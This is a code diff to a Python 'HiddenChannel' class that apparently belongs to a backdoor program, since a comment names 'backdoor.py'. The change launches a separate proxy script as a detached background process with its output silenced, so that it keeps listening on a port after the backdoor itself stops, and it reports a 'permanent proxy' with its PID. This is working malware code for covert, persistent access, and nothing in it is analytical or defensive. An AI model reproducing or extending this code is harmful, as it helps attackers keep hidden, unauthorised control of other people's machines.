@@ -20,6 +20,7 @@ class HiddenChannel:
         self.is_running = False
         self.channel_socket = None
         self.channel_thread = None
+        self.proxy_process = None  # For standalone process
         self.connections = {}  # Track active connections
         self.connection_count = 0
         self.start_time = None
@@ -173,23 +174,59 @@ class HiddenChannel:
                     pass
     
     def start_proxy_channel(self):
-        """Start the proxy channel"""
+        """Start the proxy channel as standalone process"""
         if self.is_running:
             return False, "proxy channel already running"
         
-        # No external target needed - we handle commands locally
-        
-        # Start proxy channel in background thread (NOT daemon - so it stays running)
-        self.channel_thread = threading.Thread(target=self.proxy_server_loop, daemon=False)
-        self.channel_thread.start()
-        
-        # Give it a moment to start
-        time.sleep(0.5)
-        
-        if self.is_running:
-            return True, f"proxy channel started on port {self.listen_port}"
-        else:
-            return False, "Failed to start proxy channel"
+        try:
+            # Get path to standalone proxy script
+            current_dir = os.path.dirname(os.path.abspath(__file__))
+            parent_dir = os.path.dirname(current_dir)
+            standalone_script = os.path.join(parent_dir, "standalone_proxy.py")
+            
+            # Start standalone proxy process (survives even when backdoor.py stops)
+            python_exe = sys.executable
+            cmd = [python_exe, standalone_script, str(self.listen_port)]
+            
+            # Start process in background (detached from parent)
+            if os.name == 'nt':  # Windows
+                # Use CREATE_NEW_PROCESS_GROUP to detach from parent
+                self.proxy_process = subprocess.Popen(
+                    cmd,
+                    creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                    stdin=subprocess.DEVNULL
+                )
+            else:  # Unix-like
+                self.proxy_process = subprocess.Popen(
+                    cmd,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                    stdin=subprocess.DEVNULL,
+                    preexec_fn=os.setsid  # Create new session
+                )
+            
+            # Give it a moment to start
+            time.sleep(1)
+            
+            # Test if port is now listening
+            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            test_socket.settimeout(2)
+            try:
+                result = test_socket.connect_ex(('localhost', self.listen_port))
+                test_socket.close()
+                
+                if result == 0:
+                    self.is_running = True
+                    return True, f"permanent proxy started on port {self.listen_port} (PID: {self.proxy_process.pid})"
+                else:
+                    return False, f"Failed to connect to proxy on port {self.listen_port}"
+            except:
+                return False, "Failed to test proxy connection"
+                
+        except Exception as e:
+            return False, f"Failed to start standalone proxy: {str(e)}"
     
     def stop_proxy_channel(self):
         """Stop the proxy channel"""
@@ -198,16 +235,16 @@ class HiddenChannel:
         
         self.is_running = False
         
-        # Close main socket
-        if self.channel_socket:
+        # Terminate standalone process
+        if self.proxy_process:
             try:
-                self.channel_socket.close()
+                self.proxy_process.terminate()
+                self.proxy_process.wait(timeout=3)
             except:
-                pass
-        
-        # Wait for thread to finish
-        if self.channel_thread:
-            self.channel_thread.join(timeout=3)
+                try:
+                    self.proxy_process.kill()
+                except:
+                    pass
         
         return True, f"proxy channel stopped"
     
